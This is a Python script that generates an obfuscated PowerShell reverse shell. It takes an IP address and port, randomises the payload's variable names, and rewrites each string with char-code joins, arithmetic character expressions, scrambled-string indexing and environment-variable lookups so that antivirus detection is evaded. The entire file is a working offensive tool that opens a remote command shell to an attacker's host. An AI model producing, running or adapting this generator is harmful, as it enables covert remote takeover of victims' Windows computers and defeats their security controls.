import re
import random
import string
import os

# PAYLOAD AND PATTERN
reverse_shell = r"$ReverseShellConnection = (& (\New-Object\) (\System.Net.Sockets.TCPClient\)(((\IP_ADDRESS\), (\PORT\))));$NetworkStream = $ReverseShellConnection.(\GetStream\)();$ReadBuffer = (& (\New-Object\) Byte[] 65536);while (($BytesRead = $NetworkStream.(\Read\)($ReadBuffer, 0, $ReadBuffer.(\Length\))) -ne 0) {;$CommandOutput = (& (\Invoke-Expression\) (\[System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)\));$ExecutedOutput = (& (\Invoke-Expression\) $CommandOutput 2>&1) | & (\Out-String\);$PromptWithOutput = $ExecutedOutput + (\PS > \);$OutputBytes = (& (\Invoke-Expression\) (\[text.encoding]::ASCII.GetBytes($PromptWithOutput)\));$NetworkStream.(\Write\)($OutputBytes, 0, $OutputBytes.(\Length\));$NetworkStream.(\Flush\)();}$ReverseShellConnection.(\Close\)()"

pattern = r"\\.+?\\"

# REPLACE IP/PORT
ip_address = input("Enter IP: ")
port = input("Enter port: ")
reverse_shell = reverse_shell.replace("IP_ADDRESS", ip_address)
reverse_shell = reverse_shell.replace("PORT", port)

# REPLACE VARIABLES
variables_2_replace = ["ReverseShellConnection",
                       "NetworkStream",
                       "ReadBuffer",
                       "BytesRead",
                       "CommandOutput",
                       "ExecutedOutput",
                       "PromptWithOutput",
                       "OutputBytes"]

for variable in variables_2_replace:
    random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
    reverse_shell = reverse_shell.replace(variable, random_string)

# METHOD 1
def list_2_character_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    return r"([string]::join('', ( (" + ','.join(str(ord(character)) for character in command) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"
	
# METHOD 2
def character_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    parts = []
	
    for character in command:
        rnd = random.randint(1, 99)
        operation = "+" if random.choice([True, False]) else "*"
        compliment = "-" if operation == "+" else "/"
        if operation == "+":
            part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_}| % {$_} |%{$_})"
        else:
            part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_})"
        parts.append(part)
	    
    return '+'.join(parts)

# METHOD 3
def random_string_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    char_positions = [''] * 170
    indices_used = []
    
    for character in command:
        index = random.choice([i for i in range(170) if char_positions[i] == ''])
        char_positions[index] = character
        indices_used.append(index)
        
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
		
    return "('" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_})"

# METHOD 4
env = [
	"ALLUSERSPROFILE",
	"CommonProgramFiles",
	"ComSpec",
	"ProgramData",
	"ProgramFiles",
	"ProgramW6432",
	"PSModulePath",
	"PUBLIC",
	"SystemDrive",
	"SystemRoot",
	"windir"
]

environment_variable_character_map = {}

for character in string.printable:
    environment_variable_character_map[character] = {}
    for variable in env:
        value = os.getenv(variable)
        if character in value:
            environment_variable_character_map[character][variable] = []
            for index, character_in_value in enumerate(value):
                if character == character_in_value:
                    environment_variable_character_map[character][variable].append(index)
                    
def environment_variables_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    hidden_strings = []
    for character in command:
        if character in environment_variable_character_map and environment_variable_character_map[character]:
            possible_variables = list(environment_variable_character_map[character].keys())
            chosen_variable = random.choice(possible_variables)
            possible_index = environment_variable_character_map[character][chosen_variable]
            chosen_index = random.choice(possible_index)
            hidden_strings.append(f"$env:{chosen_variable}[{chosen_index}]")
        else:
            hidden_strings.append(random.choice([list_2_character_2_string,
                                  character_2_string,
                                  random_string_2_string])(character))
    return "+".join(hidden_strings)

# REPLACE EACH MATCH WITH RANDOM METHOD
for match in range(int(reverse_shell.count("\\")/2)):
    reverse_shell = re.sub(pattern,
                           lambda m: random.choice([list_2_character_2_string,
                                                    character_2_string,
                                                    random_string_2_string,
						    environment_variables_2_string])(m),
                           reverse_shell,
                           count=1)

# WRITE TO FILE
print(reverse_shell)
